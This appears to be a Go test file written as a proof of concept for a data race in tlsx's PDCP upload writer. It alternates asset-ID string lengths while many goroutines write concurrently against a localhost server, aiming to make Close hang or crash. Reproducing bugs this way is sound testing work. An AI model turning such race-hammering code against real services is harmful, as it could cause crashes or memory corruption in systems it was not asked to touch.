package pdcp_test

import (
	"context"
	"fmt"
	"sync"
	"testing"
	"time"

	"github.com/projectdiscovery/tlsx/pkg/tlsx/clients"
	"github.com/projectdiscovery/tlsx/internal/pdcp"
	pdcpauth "github.com/projectdiscovery/utils/auth/pdcp"
)

func TestUploadWriterExploit(t *testing.T) {
	creds := &pdcpauth.PDCPCredentials{
		Server: "http://localhost:8080",
		APIKey: "test-key",
	}

	// Use a longer timeout to allow the race to manifest
	ctx, cancel := context.WithTimeout(context.Background(), 20*time.Second)
	defer cancel()

	writer, err := pdcp.NewUploadWriterCallback(ctx, creds)
	if err != nil {
		t.Fatalf("failed to create writer: %v", err)
	}

	var wg sync.WaitGroup
	callback := writer.GetWriterCallback()

	// Exploit Layer 1: Hammer the string headers with different lengths to trigger tearing
	wg.Add(1)
	go func() {
		defer wg.Done()
		for i := 0; i < 100000; i++ {
			// Alternating lengths is key to triggering pointer/length tearing
			if i % 2 == 0 {
				writer.SetAssetID("short-id")
			} else {
				writer.SetAssetID("very-long-asset-group-identifier-that-exceeds-small-string-optimization")
			}
		}
	}()

	// Exploit Layer 2: High-pressure concurrent writes
	for g := 0; g < 20; g++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			for i := 0; i < 5000; i++ {
				callback(&clients.Response{
					Host: fmt.Sprintf("target-%d-%d.com", id, i),
					Port: "443",
				})
			}
		}(g)
	}

	fmt.Println("Exploit running: Hammering ARM64 memory model...")
	wg.Wait()
	
	fmt.Println("Attempting final close (Expect hang or crash here)...")
	writer.Close()
	fmt.Println("SUCCESS: Writer closed (Vulnerability NOT triggered).")
}
